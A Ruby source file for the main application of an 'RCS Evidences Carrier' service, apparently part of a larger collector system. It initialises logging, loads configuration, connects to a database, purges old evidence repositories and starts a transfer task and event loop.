#
#  The main file of the collector
#

require 'rcs-common/path_utils'

# relatives
require_release 'rcs-collector/config'
require_release 'rcs-collector/db'
require_release 'rcs-collector/evidence_manager'
#require_relative 'statistics'
require_relative 'events'
require_relative 'evidence_transfer'

# from RCS::Common
require 'rcs-common/trace'

# from System
require 'yaml'

module RCS
module Carrier

# namespace aliasing
DB = RCS::Collector::DB
Config = RCS::Collector::Config
EvidenceManager = RCS::Collector::EvidenceManager

class Application
  include RCS::Tracer

  # the main of the collector
  def run(options)

    # if we can't find the trace config file, default to the system one
    if File.exist? 'trace.yaml'
      typ = Dir.pwd
      ty = 'trace.yaml'
    else
      typ = File.dirname(File.dirname(File.dirname(__FILE__)))
      ty = typ + "/config/trace.yaml"
      #puts "Cannot find 'trace.yaml' using the default one (#{ty})"
    end

    # ensure the log directory are present
    Dir::mkdir(Dir.pwd + '/log') if not File.directory?(Dir.pwd + '/log')
    Dir::mkdir(Dir.pwd + '/log/err') if not File.directory?(Dir.pwd + '/log/err')

    # initialize the tracing facility
    begin
      trace_init typ, ty
    rescue Exception => e
      puts e
      exit
    end

    begin
      build = File.read(Dir.pwd + '/config/VERSION_BUILD')
      $version = File.read(Dir.pwd + '/config/VERSION')
      trace :fatal, "Starting the RCS Evidences Carrier #{$version} (#{build})..."

      # config file parsing
      return 1 unless Config.instance.load_from_file

      begin
        # test the connection to the database
        if DB.instance.connect! then
          trace :info, "Database connection succeeded"
        else
          trace :warn, "Database connection failed, retry..."
          sleep 1
        end

      end until DB.instance.connected?

      # compact or delete old repos
      EvidenceManager.instance.purge_old_repos

      # start the transfer task
      EvidenceTransfer.instance.start

      # enter the main loop (hopefully will never exit from it)
      Events.new.setup

    rescue Interrupt
      trace :info, "User asked to exit. Bye bye!"
      return 0
    rescue Exception => e
      trace :fatal, "FAILURE: " << e.message
      trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
      return 1
    end

    return 0
  end

  # we instantiate here an object and run it
  def self.run!(*argv)
    return Application.new.run(argv)
  end

end # Application::
end # Carrier::
end # RCS::
